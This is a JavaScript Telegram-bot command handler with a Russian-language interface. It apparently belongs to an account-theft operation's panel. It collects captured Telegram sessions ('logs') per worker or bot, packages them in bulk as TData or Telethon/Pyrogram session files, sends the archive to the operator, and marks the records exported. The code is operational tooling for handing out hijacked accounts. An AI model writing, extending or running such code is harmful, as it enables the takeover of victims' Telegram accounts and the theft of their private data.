import { bot } from "../../index.js";
import Database from "../../../database/index.js";
import log from "../../../database/schemas/log.js";
import { exportLogs } from "../../../utils/index.js";
import fs from 'fs';
import Bot from "../../../database/schemas/bot.js";
import config from "../../../../config.json" assert { type: "json" };

export default {
    name: "export",
    async exec(query, [q, format, confirm]) {
        if (!format) {

            return await bot.editMessageCaption(query, `*📩 Выберите формат выгрузки:*`, {
                parse_mode: 'Markdown',
                chat_id: query.message.chat.id,
                message_id: query.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'TData',
                                callback_data: `export:${q}:tdata`
                            }
                        ],
                        [
                            {
                                text: '.session + .json',
                                callback_data: `export:${q}:session + json`
                            }
                        ],
                        [
                            {
                                text: '.session Telethon',
                                callback_data: `export:${q}:telethon`
                            }
                        ],
                        [
                            {
                                text: '.session Pyrogram',
                                callback_data: `export:${q}:pyrogram`
                            }
                        ],
                        [
                            {
                                text: '🔙 Назад',
                                callback_data: q ? q === 'com' ? 'admin' : 'profile' : 'start'
                            }
                        ]
                    ]
                }
            }, 'cdn/export.png');
        }

        // const logs = await log.find({ 'worker': query.from.id, 'bot': q?.replaceAll('!', '') });
        let logs = [];

        if (q === 'com') {
            logs = await log.find({ bot: q, exported: false });
        } else if (!isNaN(+q)) {
            logs = await log.find({ worker: +q, exported: false });
        } else {
            const BOT = await Bot.findOne({ username: q });
            logs = await log.find({ bot: BOT?.token || q, exported: false });
        }

        if (q !== 'com') logs = logs
            .filter(log => log.bot !== 'com');


        if (!logs.length) return await bot.editMessageCaption(query, `*✖️ Нет сессий для выгрузки.*`, {
            parse_mode: 'Markdown',
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: q ? q === 'com' ? 'admin' : 'start' : 'profile'
                        }
                    ]
                ]
            }
        });

        if (!confirm) {
            return await bot.editMessageCaption(query, `*⏳ Собрано сессий:* \`${logs.length}\`
*📩 Выгрузить в формате:* \`${format}\``, {
                parse_mode: 'Markdown',
                chat_id: query.message.chat.id,
                message_id: query.message.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '✅ Выгрузить',
                                callback_data: `export:${q}:${format}:true`
                            }
                        ],
                        [
                            {
                                text: '🔙 Назад',
                                callback_data: `export:${q}`
                            }
                        ]
                    ]
                }
            }, undefined, true);
        }

        const path = await exportLogs(logs, format);
        await bot.sendDocument(query.from.id, path);
        fs.rmSync(path.replaceAll(`/sessions_${format}.zip`, ''), {
            force: true,
            recursive: true
        });

        await bot.editMessageCaption(query, `*✅ Успешно выгруженно:* \`${logs.length}\`
*📩 Формат:* \`${format}\``, {
            parse_mode: 'Markdown',
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'bots'
                            // callback_data: q ? q === 'com' ? 'admin' : 'start' : 'profile'
                        }
                    ]
                ]
            }
        }, undefined, true);
        if(config.app_prod) {
            logs.forEach(async _log => {
                await log.findOneAndUpdate({ _id: _log._id }, { $set: { exported: true } });
            });
        }
    }
}